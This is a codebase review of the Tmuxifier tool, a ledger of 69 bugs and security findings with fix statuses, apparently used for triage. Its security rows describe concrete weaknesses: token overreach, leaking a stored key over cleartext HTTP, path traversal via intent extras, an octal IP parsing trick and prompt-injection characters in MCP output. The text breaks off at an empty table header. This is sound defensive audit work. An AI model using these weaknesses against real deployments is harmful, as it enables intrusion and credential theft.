# Codebase Review — Tmuxifier

**Date:** 2026-11-03
**Version reviewed:** v1.24.73 (`main` @ 438e727, clean tree)
**Scope:** All of `src/server/` (91 `.js` modules + 2 `.sh` assets), `src/web/` (84 code/HTML/CSS
files across 98 tracked files), `src/mcp/` (7 `.js` modules), `android/` (23 main `.kt` + 10 JVM
test `.kt` files, Gradle build, manifest), `scripts/` (6 CLI scripts), `deploy/`, `docs/`, and
`test/` (204 Vitest files, 20 Playwright e2e specs) — a full-codebase pass, not a delta. Major
subsystems added or expanded since `codebase-review-2026-07-29.md` (v1.22.3) include the Android
Console app + FCM push + on-host APK builder, the stdio MCP server + device enrollment/pairing,
Claude Code agent hooks + ALSA FIFO voice link, QEMU VM support + cross-cluster Proxmox guest
following + container readdressing, Fleet Command saved scripts, tmux window/session switching and
kill controls, terminal mode replay on reattach, and the theme engine (`original` / `vercel`).
**Method:** Ten parallel domain-scoped deep reviews (server core/auth/devices/FCM; SSH/tmux/PTY/
Host Shell; setup/AI-auth/Claude hooks/voice; Proxmox/NetBox/lifecycle; status/health/fleet/service
integrations/icons; web core/stage/terminal/modals; web features/Proxmox hub/settings/themes; MCP
server + CLI scripts; Android Console; docs/hygiene/dependencies/test suites), followed by
first-hand verification of every finding against HEAD (`438e727`).
**Baseline:** `npm test` (`tsc --noEmit && vitest run`) green — 2786/2786 across 204 files (146s).
`npm run test:e2e` green — 90/90 across 20 specs (96s). Android `./gradlew testDebugUnitTest`
green — 68/68 across 10 suites (8s). Captured before any finding was written.

Disposition of the 26 `Open` rows from `codebase-review-2026-07-29.md`: 1 is resolved (`2026-07-29
B26` — `src/web/proxmoxAssociation.ts:88-97` now fails closed to `''` when a saved vmid is absent
from the guest list); the remaining 25 were re-verified against `438e727` and are carried forward
below with updated line numbers and `*(carry-forward: 2026-07-29 <ID>)*` tags so this file stands
as a complete single ledger. Three carried-forward items widened in blast radius as surrounding
features grew (`2026-07-29 S7` → `S3` Medium, `B12` → `B30`, `B17`/`C4` → `B32`/`C2`).

> This is a point-in-time review captured for triage. Line numbers reference the reviewed commit
> (438e727) and have drifted where fixes have landed — see the status notes below.
>
> **The Status column in the tables below is the live fix ledger.** When a fix ships, change its
> entry from `Open` to `✅ vX.Y.Z` (or `Won't fix` with a reason), and add a dated status note
> under this header describing the batch — the same convention the prior reviews use.

**69 findings: 7 High, 27 Medium, 35 Low.** No Critical. Core authentication, WebAuthn, `secretBox`
sealing/redaction, SSH argv safety, TLS fingerprint pinning, service-integration read-only
guarantees, Claude voice-link FIFO safety, and web XSS boundaries were each verified end-to-end and
are **clean** — see "What was verified clean" at the end.

**Status note, 2026-11-04 (batch 1, v1.24.74): all 7 High findings (`B1`–`B6`, `S1`) are
resolved.** Test-first across server, MCP, shell hook, and Android JVM suites: `S1` enforces a
default-deny `DEVICE_ALLOWED_ROUTES` allowlist in `requireAuth` (`403 browser session required`
outside the Android Console and MCP surface, `sessionName`-only on `PATCH /api/boxes/:id`, and
power-only actions on `POST /api/proxmox/lifecycle-jobs` + `src/mcp/apiClient.js`); `B1` shares one
`OkHttpClient` and memoizes `ApiClient` per `(baseUrl, token)` in `AppState` (`ClientCache`),
clearing on `null`/`signOut()`; `B2` registers synchronous `close`/`error` tracking before the
first `await` on `/term` and `/voice-link` so mid-lookup disconnects cannot leak PTYs or voice
writers; `B3` treats `#{session_attached} > 0` as attached so multi-viewer sessions continue
suppressing `agent-input`/`agent-done` events; `B4` keys `proxmoxInventory.refreshLinked`
in-flight coalescing by the canonical linked-box set so single-box `probeOne` calls never truncate
full-fleet sweeps; `B5` strips `\r\n` before charset sanitization in `tmuxifier-agent-hook.sh`'s
`json_str()`; and `B6` passes `createSession: false` when saving Host Shell settings (updating
session-level `default-shell` on exact `=local:` only if `=local` exists) and uses exact `=name`
targets in `buildEnsureTmuxRemote`. Suites: unit/integration `2796/2796` across 204 files,
typecheck clean, Android JVM `11/11` suites green.

**Status note, 2026-11-04 (S1 follow-up, v1.24.75):** a post-release audit of v1.24.74 found the
allowlist still let a device token reach the host and the host's AI credentials: `POST /api/boxes`
accepted loopback, `POST /api/fleet/jobs` runs any command, and `seedAiAuth` was honored on setup
and provisioning. Device tokens now get a `403` for `seedAiAuth` on both routes, and for a box whose
host or jump hop resolves to this machine or can't be resolved (`deviceHostGuard.js`). The operator
chose to keep `add_box`, so the host check is deliberately **partial**: a re-pointed name or a TCP
forwarder still passes. `docs/mcp.md` now states that residual and the mitigation (the host's key
out of its own `authorized_keys`).

---

## Findings and fix tracking

Severity reflects likelihood × blast radius for this single-user tool, not CVSS. Effort is a
rough fix-size guess: **S** = under an hour, **M** = a few hours. High and Medium findings have a
detailed explanation in the sections after the tables; Lows are described fully in their row.

### Bugs

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| B1 | android | `AppState.client()` (`AppState.kt:21-25`) allocates a new `ApiClient` + `OkHttpClient` on every recomposition; `FleetScreen` (`L72,84`) and `SessionScreen` (`L103,133`) key `LaunchedEffect` on `client`, so every poll state update triggers recomposition, cancels `delay(...)`, and re-enters an unthrottled 0 ms HTTP poll loop while leaking OkHttp connection/thread pools | **High** | S | Hold one shared `OkHttpClient` and memoize `ApiClient` per `(baseUrl, token)` in `AppState` (or key `LaunchedEffect` on `(baseUrl, token)`) | ✅ v1.24.74 |
| B2 | ws / sessions | `/term` (`server.js:1998-2162`) and `/voice-link` (`server.js:2174-2185`) `await` async work (`localTmuxScope.ensure`, `store.getBox`) before registering `socket.on('close')` and without checking `socket.readyState !== 1` — a client disconnect during `await` leaks the attached listener forever (`#{session_attached}` stuck `>= 1`, permanently suppressing agent alerts and exhausting the 8-viewer cap) | **High** | S | Attach `socket.once('close', ...)` synchronously before the first `await` and bail out if closed or `socket.readyState !== 1` before opening/attaching | ✅ v1.24.74 |
| B3 | status / health | `parseTmuxSessions` (`status.js:249`) checks `attached === '1'` on `#{session_attached}`, which is tmux's attached **client count** (`0, 1, 2, …`) — with `>= 2` viewers attached (two browser panes/tabs, or browser + Android `ensureSizedViewer`), `attached` becomes `false`, firing false `agent-input`/`agent-done` notifications and FCM pushes while watched | **High** | S | Replace `attached === '1'` with `Number(attached) > 0` | ✅ v1.24.74 |
| B4 | proxmox / status | `proxmoxInventory.refreshLinked(boxes)` (`proxmoxInventory.js:489-493`) shares one `inFlight` promise regardless of `boxes`; when `statusPoller.probeOne` (`statusPoller.js:111-113`) calls `refreshLinked([singleBox])`, concurrent `pollOnce()` or `GET /api/proxmox/guests` callers receive the 1-box array — truncating the hub guest list and probing stopped linked containers over SSH (firing false `down` events) | **High** | S | Coalesce `inFlight` only for full-fleet sweeps; give subset/single-box callers their own uncoalesced run | ✅ v1.24.74 |
| B5 | claude-hooks | `json_str()` (`tmuxifier-agent-hook.sh:34-39`) pipes `sed \| head -n 1` directly into `tr -c 'A-Za-z0-9._-' '_'`, turning trailing `\n` (on multi-line JSON under GNU `sed` and every match under POSIX/BusyBox `sed`) into `_` (`NT="idle_prompt_"`), bypassing `busy_live` at `L126` and marking sessions `waiting` while subagents or background Bash tasks still run | **High** | S | Pipe through `tr -d '\r\n'` before `tr -c 'A-Za-z0-9._-' '_'` | ✅ v1.24.74 |
| B6 | host-shell | `PATCH /api/local-shell` (`localShellActions.js:12-16` → `boxActions.js:495-506`) omits `createSession: false`: saving Host Shell settings (e.g. toggling Claude hooks) runs `respawn-window -k` and SIGKILLs window 1 of a live `=local` session, uses non-exact `-t 'local'`, or creates `local` inside `tmuxifier.service`'s cgroup instead of `localTmuxScope.js`'s `systemd-run --scope` | **High** | S | Pass `createSession: false` in `buildEnsureLocalShellScript` and use exact `=${s}` targets in `boxActions.js:503-504` | ✅ v1.24.74 |
| B7 | immich | `createImmichClient.refresh()` (`immichApi.js:80-109`) tags HTTP 5xx and HTML 200 responses as `'unexpected'` (`L84-85`) and then ignores `'unexpected'` completely, returning `{ ok: true }` — a 502 reverse proxy or HTML login page renders green `up` and passes `/api/services/immich/test` | Med | S | Require `'ok'` on `/api/server/about` (or fail with `kind: 'unexpected'` when no endpoint returns `'ok'`/`'denied'`) | Open |
| B8 | truenas | `createTruenasClient` `open()` (`truenasApi.js:135-156`) clears its connect timer on `s.on('close')` (`L153`) without rejecting when `!settled`; a clean TCP/WS close or `client.close()` while `CONNECTING` hangs `open()`, `ready`, and `serviceChecker.pollOnce()` (`inFlight`) forever | Med | S | When `!settled` in `s.on('close')`, reject `open()` with a `kind: 'unreachable'` error and call `teardown` | Open |
| B9 | android | `AndroidManifest.xml:6-13` allows cloud Auto Backup and `TokenStore.kt:13-19` leaves `EncryptedSharedPreferences.create` unguarded — after restore/reinstall without the Keystore master key, `MainActivity.onCreate` and `PushService.onNewToken` crash on launch with `GeneralSecurityException` (and plaintext `prefs.xml` drafts are backed up) | Med | S | Set `android:allowBackup="false"` (or exclude `auth` + `prefs` in backup rules) and recover from `GeneralSecurityException` by deleting `"auth"` prefs and recreating once | Open |
| B10 | boxes / setup | `POST /api/boxes/:id/reconnect` (`server.js:1059-1077`) omits the running-setup 409 gate and calls `sessions.closeGroup(box.id)` without `'terminal'` scoping, killing the shared ControlMaster underneath a running setup job or closing an active `mode=provision` sudo/password PTY | Med | S | Gate on `setupManager?.currentForBox(box.id)?.status === 'running'` (409) and scope `closeGroup(box.id, 'terminal')` when `needs-interactive` is active | Open |
| B11 | proxmox / netbox | `runReaddress` (`proxmoxLifecycle.js:61,343,352-377,464-470`) overwrites `box.netboxIpId` before `release`: a restart during `release` leaks `oldNetboxIpId` while `chaseable` (`L466`) warns that the **new** active `netboxIpId` (even at `verify`) may be orphaned; also `L343,373` run `knownHosts.forget` even when `newHost === oldAddr` | Med | S | Persist `oldNetboxIpId` on the job for boot-reconciliation release, exclude `verify` from the leak warning, and skip `knownHosts.forget` when `newHost === oldAddr` | Open |
| B12 | proxmox / netbox | `proxmoxProvision.js:137-186` never checks `boxStore.uniquenessConflict({ host: boxHost })` after `allocateIp` on `auto-static` presets (and `L138` skips `isIp(res.gateway)`): if NetBox hands out an IP already in `boxes.json`, Tmuxifier builds a duplicate container on that IP, wipes the existing box's `known_hosts` entry (`L179`), and only then fails at `addBox` (`L181`) | Med | S | Validate `isIp(res.gateway)` and check `boxStore.uniquenessConflict({ host: boxHost })` immediately after `allocateIp` before creating the container | Open |
| B13 | fleet | `cancelJob` (`fleet.js:83-94,100-148,203-208`) neither flips `pending` targets nor checks `cancelled.has(job.id)` at worker start (`L103`) or after `await masterAlive` (`L109`), so cancelling before the first SSH command completes still runs up to `concurrency` boxes and marks remaining `pending` targets `'error'` (`'did not run'`) instead of `'cancelled'` | Med | S | Flip `pending` targets to `'cancelled'` in `cancelJob`, check `cancelled.has(job.id)` before and after `masterAlive`, and preserve `'cancelled'` in `finalize` | Open |
| B14 | ssh / setup | `LOCAL_BIN_PATH_BLOCK` and `.tmux.conf.local` dedup (`boxActions.js:256-264,358-360,412-414`) append `# tmuxifier-local-bin` / `# tmuxifier-truecolor` lines without ensuring a leading newline (unlike `aiAuthSeed.js:40`); on a file missing a trailing `\n`, run 1 concatenates onto the user's last line and run 2's `sed -i '/# tmuxifier-local-bin$/d'` deletes that user line | Med | S | Reuse `aiAuthSeed.js:40`'s `tail -c 1` trailing-newline guard before appending | Open |
| B15 | tls | `pinnedSocket` (`tlsPin.js:50-53`) calls `socket.setTimeout(0)` after TLS verification without removing its `'timeout'` listener, so a slow HTTP response that trips `req.setTimeout` in `proxmoxApi`/`netboxApi`/`unifiApi` triggers `pinnedSocket`'s listener first with a misleading `'TLS connection timed out'` error | Med | S | Remove the handshake `'timeout'` listener alongside `socket.setTimeout(0)` | Open |
| B16 | health | `createHealthHistory` (`healthHistory.js:186-188,245`) runs `events.reduce((m, e) => Math.max(m, e.seq \|\| 0), 0)` over `data/health-events.json` without filtering non-object/`null` rows — the `2026-07-29 B10` boot-crash class — throwing `TypeError` synchronously at `index.js:306` | Med | S | Filter loaded rows with `e && typeof e === 'object' && typeof e.seq === 'number'` | Open |
| B17 | web / dashboard | `dashboard.ts:501-538,650-666` stores rendered tiles across five per-kind maps (`tileEls`, `cardEls`, `truenasEls`, `unifiEls`, `immichEls`) while pruning only by `!tilesSeen.has(id)` — changing an existing service's `check.kind` across card types leaves a permanent duplicate zombie tile in the old map until reload | Med | S | Evict `svc.id` (`old.root.remove(); map.delete(svc.id)`) from the other four maps in `paintTile` | Open |
| B18 | web / css | `style.css`: `.event-icon` (`L1780`) and `.clawd` (`L568-572`) omit `'MesloLGMDZ Nerd Font'`, rendering Nerd Font PUA glyphs as missing-glyph tofu (`□`) and misaligning sprite cells under default `vercel` and `original` themes; `.provision-log` (`L1423`) inherits sans `--face`; `.provision-panel` (`L1354-1371`) lacks `visibility: hidden` when closed, leaving off-screen controls Tab-focusable | Med | S | Pin Meslo on `.event-icon` and `.clawd`, `--face-code` on `.provision-log`, and `visibility: hidden` on closed `.provision-panel` | Open |
| B19 | web / modals | Four `mount: app` modals (`main.ts:2266,3196,3326,3375`) omit `registerModal`, leaking `document` keydown listeners, `openBackdrops`, and CodeMirror across logout/401 teardown; `Escape` inside nested `confirmDiscard` (`L3375`) also triggers `openFleetScriptModal`'s `onKey` (`L3418`), closing both dialogs and losing unsaved script edits; `openBoxDialog` (`L2478`) / `openLocalShellEditModal` (`L2218`) mount modals onto `#app` after a 401 teardown | Med | S | Register all `openModal` sites (remove the `mount:` exemption in `modalRegistration.test.js`), guard `openFleetScriptModal`'s `onKey` when a child modal is stacked above it, and bail after pre-open `await`s if logged out | Open |
| B20 | web / login | Fresh password (`main.ts:516`) and passkey (`main.ts:538-542`) logins call `loadUiSettings()` + `renderDashboard()` without `api.uiConfig()` (`setTerminalFont` + `setTerminalUploads`, called only at boot in `start()` `L416-425`), ignoring custom `TMUXIFIER_TERM_FONT`, `TMUXIFIER_TERM_FONT_SIZE`, and `TMUXIFIER_UPLOAD_MAX_MB` until page reload | Med | S | Extract `loadUiConfig()` and invoke it on both login paths alongside `loadUiSettings()` | Open |
| B21 | web / voice | When `dictationEnabled === false`, `reducePress` (`voicePress.ts:36-64`, `voiceUi.ts:208-211,335-339`) still enters `'recording'` on non-Claude panes and refused links (`4002`), capturing mic audio up to `maxSeconds` only to discard it on release; also `voiceRecorder.ts:51-65` and `finishDictation` (`voiceUi.ts:327-369`) lack cancellation/disposal guards across `await`s | Med | S | Pass `dictationEnabled` into `reducePress` so non-Claude verdicts and refused links stop immediately to `'idle'`, and guard async continuations in `voiceRecorder.ts` and `voiceUi.ts` | Open |
| B22 | dev | `vite.config.ts:29-33` proxies `/api` and `/term` in `npm run dev` but omits `/voice-link`, breaking Claude Code voice links in dev mode | Med | S | Add `'/voice-link': { target: ws, ws: true, secure: false }` to `server.proxy` | Open |
| B23 | mcp | `src/mcp/config.js:24-26,44` double-brackets IPv6 `bindAddress` (`[::1]` → `https://[[::1]]:7437`, `[::]` missed by `WILDCARD_BINDS`) and compares `baseUrl === configUrl` as raw strings so `caFile` is dropped on equivalent origins | Med | S | Strip surrounding `[` `]` before `WILDCARD_BINDS`/formatting and compare normalized URL origins for `caFile` | Open |
| B24 | mcp | `src/mcp/tools.js:114-117,146,172-182,224-229`: `wait_for_agent` and `box_health` do not verify `box_id` exists (hanging up to 540 s on typos, or returning immediately for `until: ['gone']`), `until: []` hangs until timeout, `limit <= 0` mis-slices `job_status`, and `provision_guest`'s `setup_options` expects unvalidated camelCase while `start_setup` uses validated snake_case | Med | S | Verify `box_id` exists, require non-empty `until` and `limit >= 1`, and share snake_case/camelCase normalization + `SETUP_TOOLS` validation across `start_setup` and `provision_guest` | Open |
| B25 | mcp | `src/mcp/index.js:15,69-72`, `jsonrpc.js:17`, `apiClient.js:64-105`: `console.info`/`console.debug` still write to JSON-RPC `stdout`; `stdin` EOF during `wait_for_*` leaves `setTimeout` keeping Node alive for up to 540 s; and `jsonrpc.js` / `apiClient.js` buffer unbounded line/response bytes with only a socket-idle timeout | Med | S | Redirect `console.info`/`debug` to `stderr`, abort/unref wait timers on `stdin` close, and enforce byte caps + end-to-end request deadlines | Open |
| B26 | status | `cleanWindowName` (`status.js:184`) omits C1 controls `\u0080-\u009f` (`U+009B` CSI, `U+009D` OSC) despite its comment (`L178`) and `UNSAFE_NAME_RE` (`L235`); also `status.js:310` treats non-zero SSH exit as reachable (`tmux: true`) whenever stdout is non-empty (e.g. a jump-host/PAM failure banner) even with zero probe markers | Low | S | Add `\u0080-\u009f` to `cleanWindowName` and require a recognized probe marker (`__NO_TMUX__`/`__META__`/valid session row) when `res.code !== 0` | Open |
| B27 | status | `checkBox` (`status.js:341-351`) bypasses `inflight` coalescing whenever `hasLiveSession(box)` is true (right when a pane is open and the dropdown calls `POST /api/boxes/:id/probe`, contradicting `server.js:1042-1044`) and defaults missing `masterAlive` to `true` (`L342`) vs `false` in `listSessions` (`L397`) and `fleet.js:109` | Low | S | Run the `hasLiveSession` probe path through `inflight` and align the `masterAlive` fallback | Open |
| B28 | icons | `iconStore.js:88-92,179-183` aborts `get(svc.url)` when an HTML homepage exceeds `MAX_BYTES` (256 KB) before `refreshFavicon` can slice `HTML_PREFIX_BYTES` (64 KB), failing on large SPA index pages; and `PATCH /api/services/:id` (`server.js:1216-1221,1235-1241`) still skips re-scraping on `url` edits because `resolve(svc)` hits stale `data/icons/<id>.*` *(carry-forward: 2026-07-29 B18)* | Low | S | Allow prefix-only reads (`maxBytes` / early close at 64 KB) for HTML scrape fetches, and forget + re-scrape on `url` changes | Open |
| B29 | routes / pty | Small validation/cache gaps: `PUT`/`DELETE /api/netbox/settings` (`server.js:1647-1651`) do not clear the 60 s `netboxSummaryCache` (`L1711`); `GET /api/netbox/next-ip` (`L1692`) accepts `vlan=0` and `4095..9999` despite its `'1..4094'` error text; `POST /api/proxmox/hosts` (`L1435-1441`) probes PVE before `assertHostInput`; `sessions.open`/`openLocal`/`resize` (`sessions.js:104-179,263-265`) lack `>= 1` lower-bound clamping on `cols`/`rows` | Low | S | Clear `netboxSummaryCache` on settings mutation, check `vlan >= 1 && vlan <= 4094`, run `assertHostInput` before `probeHost`, and clamp `cols`/`rows` to `1..500` | Open |
| B30 | pollers | Both `serviceChecker.start()` (`serviceChecker.js:50-54`) and `statusPoller.start()` (`statusPoller.js:165-169`) schedule `setInterval` only after `await pollOnce()` resolves; because `index.js:406-407` catches `.start()` rejections, a transient first-sweep error leaves status/health/FCM or service polling permanently stopped *(carry-forward: 2026-07-29 B12 + `statusPoller` twin)* | Low | S | Schedule `setInterval` inside `try/finally` (or before `await pollOnce()`) in both pollers | Open |
| B31 | stores | `debouncedJsonStore.js:19-30` exits `while (pending !== null)` on `writeFileAtomic` failure without retrying a newer `pending` snapshot queued mid-write, losing the newer state and leaving subsequent `whenIdle()` calls dangling if awaited before another `save()` *(carry-forward: 2026-07-29 B14)* | Low | S | Continue draining `pending` in `finally` (or re-loop on error when `pending !== null`) before settling `idleResolvers` | Open |
| B32 | voice / jobs / setup | Three server lifecycle residuals: `getVoiceEngine()` (`index.js:122-137`) has no in-flight lock across `await resolveVoice()`/`stop()` so concurrent model-switch calls can orphan a ~0.85 GB engine until idle timeout *(2026-07-29 B15)*; `setupManager.cancelForBox` (`setupManager.js:416-423`) leaves a removed box's `needs-interactive` job parked forever *(2026-07-29 B16)*; `voiceInstall.js:69-72,180` and `apkBuild.js:51-54,110` never prune terminal job history *(2026-07-29 B17 + `apkBuild` twin)* | Low | S | Serialize `getVoiceEngine()` rebuilds, flip `needs-interactive` to `superseded` in `cancelForBox`, and cap terminal job history in `voiceInstall.js` and `apkBuild.js` | Open |
| B33 | web / teardown | `teardownWorkspace()` (`main.ts:4003-4051`) does not reset `fleetMode`, `fleetSelected`, `fleetScriptDraft`, `connStates`, or `disarmReconnect()`, leaving `.fleet-select-all` out of sync on re-login; and `renderDashboard()` (`main.ts:1563,1702`) attaches duplicate `document` `dragend` and `Escape` listeners on every re-login | Low | S | Reset fleet/reconnect/conn state in `teardownWorkspace()` and register the two `document` listeners once (or remove on teardown) | Open |
| B34 | web / stage | `stageLayout.restore()` (`stageLayout.ts:220-267`) dereferences `p.focusedId` (`L230`) without guarding `p === null` (`restore("null", ['a'])` throws `TypeError` out of `renderDashboard`), and still leaves recursive `sanitize()` outside a `try/catch` *(carry-forward: 2026-07-29 B23, sharpened)* | Low | S | Guard `!p \|\| typeof p !== 'object'` and wrap the full `restore()` body in `try/catch` returning `fallback` | Open |
| B35 | web / pointer | `pointerdown` handlers in `voiceUi.ts:440`, `touchKeys.ts:168`, `composer.ts:59`, and `stagePanes.ts:152` omit `if (ev.button !== 0) return;` (right/middle-click triggers mic capture/unlink, sends keys, or drags dividers), and `stagePanes.ts:152-172` still omits `pointercancel`/`lostpointercapture` cleanup *(carry-forward: 2026-07-29 B22)* | Low | S | Gate mouse `pointerdown` on `ev.button === 0` and clean up divider drag on `pointercancel`/`lostpointercapture` | Open |
| B36 | web / fleet & dash | `fleetScriptRail.ts:48-92` wipes `list.innerHTML` when arming delete (`✕`), dropping keyboard focus so Enter-twice cannot confirm; `fleetPoll.ts:38-45` polls 404/errored jobs every 1.5 s forever without `lifecyclePoll.ts`'s 404/retry cap; `dashboard.ts:404-409` rebuilds `buildClawd()` DOM on every status tick while `working`, resetting its CSS animation mid-cycle | Low | S | Toggle armed button state in place (or restore focus), cap 404/consecutive errors in `fleetPoll.ts`, and skip rebuilding `.clawd` when already mounted | Open |
| B37 | web / icons & fmt | `serviceIcon.update()` (`serviceIcon.ts:47-53`) still keys its skip-guard on `svc.id` alone so edited icons never repaint *(carry-forward: 2026-07-29 B19)*; `fmt.ts:5-8,16-21,36-43` and `unifiCard.ts:49-55` still emit rounding-boundary strings (`"1000.0k"`, `"1024 KB"`, `"1000ms"`, `"1000 Mbps"`) *(carry-forward: 2026-07-29 B24)* | Low | S | Include `svc.icon`/`svc.url` in `serviceIcon`'s key, and promote units when the rounded mantissa reaches the next threshold | Open |
| B38 | web / stage & term | `repaintStage()` (`main.ts:1090-1102,1153`, `paneLifecycle.ts:142-317`) still tears down in-flight pane-header lifecycle chips and their fast-poll callbacks *(carry-forward: 2026-07-29 B20)*; `openProvisionTerminal` (`terminal.ts:628,677-678`, `server.js:2092-2095`) still refits locally on resize without forwarding `'r'` to the provision PTY *(carry-forward: 2026-07-29 B21)* | Low | M | Preserve or re-adopt in-flight lifecycle state across `repaintStage()`, and handle `'r'` resize messages on `mode=provision` sockets | Open |
| B39 | web / settings & hub | Tab switches in `settingsUi.ts:58-65` and `proxmoxUi.ts:55-59,80-166` still lack a render-generation guard *(2026-07-29 B27)*; `proxmoxUi.ts:212-215` drops `statusline`, `agentHooks`, and `voiceLink` outcomes *(2026-07-29 B29, widened)*; `passkeys.ts:44-77` checks `!hasWebAuthn` before `!isSecureContext` *(2026-07-29 B25)*; and `settingsVoice.ts:173-181,226-231,237` leaves controls out of sync on failed saves/installs *(2026-07-29 B30)* | Low | S | Add a tab render counter, render all setup phase outcomes in `proxmoxUi.ts`, check `!isSecureContext` first in `passkeys.ts`, and `refresh()` on error in `settingsVoice.ts` | Open |
| B40 | android | `SettingsScreen.kt:93-95` swallows `401` on notification-toggle `PATCH` without calling `onUnauthorized()` or reverting the optimistic toggle; `AppState.signOut()` (`AppState.kt:31-34`) leaves plaintext `draft.*` and `fcmClientConfig` in `Prefs`; `ServerConfig.kt:6-17` `normalizeBaseUrl` accepts `?`/`#` in the authority (`https://host?x` → `https://host?x/api/boxes`) | Low | S | Handle `401`/errors in `SettingsScreen`, clear `Prefs` on `signOut()`, and reject `?`/`#`/paths in `normalizeBaseUrl` via `HttpUrl.parse` | Open |
| B41 | scripts | `promptHidden` in both `scripts/hash-password.js:38-52` and `scripts/mcp-enroll.js:89-96` checks `ch === '\r' \|\| ch === '\n'` on the whole `data` chunk instead of per character, embedding trailing newlines into pasted passwords *(carry-forward: 2026-07-29 B31 + `mcp-enroll` twin)* | Low | S | Iterate `for (const c of ch)` inside `onData` in a shared helper | Open |
| B42 | health | `createHealthHistory` `emit()` (`healthHistory.js:201`) wraps `fn(e)` in synchronous `try/catch` only, so an async `onEvent` listener returning a rejected Promise causes an unhandled rejection | Low | S | Attach `Promise.resolve(fn(e)).catch(() => {})` inside `emit()` | Open |

### Safety and security

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| S1 | auth / devices | `requireAuth` (`server.js:591-607`) grants any Bearer device token (including plaintext `data/mcp-token.json`) full operator access to almost every `/api/*` route, relying on 8 ad-hoc `if (req.deviceId)` denylists — exposing Host Shell execution (`PATCH /api/local-shell`, `POST /api/upload?box=__local__`), `deprovision`, box deletion, `/api/import`, and Proxmox/NetBox/service admin routes, directly contradicting `README.md:240-241` | **High** | M | Enforce a default-deny `(method, route)` allowlist in `requireAuth` when `req.deviceId` is set (and forbid `action: 'deprovision'` for device tokens on `/api/proxmox/lifecycle-jobs` + `src/mcp/apiClient.js:159`) | ✅ v1.24.74 |
| S2 | android | Exported `MainActivity` (`AndroidManifest.xml:13`, `MainActivity.kt:76,107,158-162`) routes arbitrary external `intent.getStringExtra("boxId")` extras straight into unencoded URL paths in `ApiClient.kt:80-126` (`"/api/boxes/$boxId/..."`), enabling authenticated path traversal (`../../...`); `OkHttpClient` (`ApiClient.kt:33`) also follows cross-origin/HTTP redirects with the `Authorization` header | Med | S | Validate `boxId` against `^[A-Za-z0-9_-]{1,64}$` in `MainActivity` and `ApiClient`, `Uri.encode` path segments, and set `followRedirects(false)` / `followSslRedirects(false)` | Open |
| S3 | services / netbox | All four `/api/services/{pihole,truenas,unifi,immich}/test` routes (`server.js:1263-1364`) and `POST /api/netbox/test` (`L1654-1675`) decrypt the stored secret by `id` without checking `stored.check.kind === routeKind` or matching `body.url` against the stored origin — allowing a sealed HTTPS-only UniFi/TrueNAS/NetBox key to be exfiltrated in **cleartext HTTP** via `/api/services/pihole/test` or `/immich/test` *(widened from 2026-07-29 S7)* | Med | S | When falling back to a stored secret, require `stored.check.kind === routeKind` and exact scheme + host:port match with the stored URL | Open |
| S4 | mcp | `src/mcp/shape.js:8-12,23,38-41,123-137`: `untrustedText()` strips `INVISIBLE` (`\p{Cf}` bidi/zero-width, `\p{Cs}`, `U+E0000–U+E007F` Unicode tag-block prompt-injection chars), but `stripSgr()` (`read_pane`) leaves `INVISIBLE` intact and `clip()` (`job_status` / `wait_for_job` stdout/stderr/logs) strips neither ANSI/OSC escapes nor `INVISIBLE` | Med | S | Strip `INVISIBLE` in `stripSgr()` and pass `clip()` outputs through escape + `INVISIBLE` sanitization | Open |
| S5 | sessions | `sessions.openLocal` (`sessions.js:149-179,315-327`) omits `assertViewerRoom` (`maxViewersPerBox = 8`), allowing unlimited host PTY spawns via distinct `client=` query IDs on `/term?box=__local__` | Med | S | Call `assertViewerRoom(LOCAL_GROUP)` at the top of `openLocal` | Open |
| S6 | proxmox / ssh | `isIp` (`proxmoxValidate.js:22-25`) accepts leading-zero IPv4 octets (`192.0.2.050`), which `node:net`'s `isIP` rejects (`knownHosts.js` skips `ssh-keygen -R`) while glibc/OpenSSH `inet_aton` parses `050` as **octal `40`** (`192.0.2.40`), connecting SSH to a different host than validated | Med | S | Reject leading zeros on multi-digit IPv4 octets (`!/^0\d/.test(p)`) in `proxmoxValidate.js` | Open |
| S7 | web | CSP `connect-src 'self' ws: wss:` (`server.js:47`) still whitelists all `ws:`/`wss:` origins *(carry-forward: 2026-07-29 S6)*; and `dashboard.ts:472,528` / `*Card.ts` assign `root.href = svc.url` without a client-side `http(s):` scheme guard if `data/services.json` were ever hand-edited | Low | S | Drop `ws: wss:` from `connect-src` (verify same-origin WS across browsers) and guard `svc.url` with `/^https?:\/\//i` before setting `href` | Open |
| S8 | statusline | `claude-statusline.sh:39-55,110` still prints `printf '%b\n' "$OUT"`, expanding backslash escapes inside untrusted `VERSION`/`BASE`/`BRANCH` strings *(carry-forward: 2026-07-29 S8)* | Low | S | Strip `\` and control characters from parsed values or print untrusted segments via `%s` | Open |
| S9 | status / boxes | A jump host's changed key still classifies the target box as `hostKeyChanged` (`status.js:150,313-315`), and `POST /api/boxes/:id/forget-hostkey` (`server.js:1084-1093`) still ignores `ssh-keygen -R` exit codes *(carry-forward: 2026-07-29 S9 & S10)* | Low | S | Suppress `hostKeyChanged` when `proxyJump` is set (or match banner host), and surface non-zero `ssh-keygen -R` exit codes | Open |
| S10 | deps | `npm audit` flags 3 moderate advisories in `@fastify/static@10.1.8`'s transitive `glob`/`minimatch` (`GHSA-3g3m-2fjr-6pw4`, `GHSA-g3hv-75wg-m249`; not user-reachable under `wildcard: false`) | Low | S | Bump `@fastify/static` (or add a targeted `overrides` pin) once upstream ships the updated `glob` range | Open |

### Efficiency

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
|----|------|---------|----------|--------|--------------|--------|
| E1 | netbox | `netboxSummary` (`netboxApi.js:237-241`) fetches `countIpsInPrefix` sequentially in a `for … await` loop across up to 100 prefixes, and `GET /api/netbox/summary` (`server.js:1711-1720`) has no in-flight coalescing on cold/expired cache | Low | S | Bound `countIpsInPrefix` with `mapWithConcurrency(items, 6, ...)` (matching `unifiApi.js`) and coalesce concurrent `/api/netbox/summary` refreshes | Open |
| E2 | status / sessions | While Android `SessionScreen` polls `/pane?cols=&rows=` at 1 s, `ensureSizedViewer` (`sessions.js:220-237`) keeps `hasLiveSessionForBox` true, causing `statusChecker.checkBox` (`status.js:341-351`) to spawn an extra `ssh -O check` subprocess on every status probe and bypass `inflight` coalescing | Low | S | Exclude `needs-interactive` password prompts specifically (or skip the extra `masterAlive` pre-check when `BatchMode=yes` already covers non-interactive terminals) | Open |

### Consolidation

| ID | Area | Finding | Severity | Effort | Proposed fix | Status |
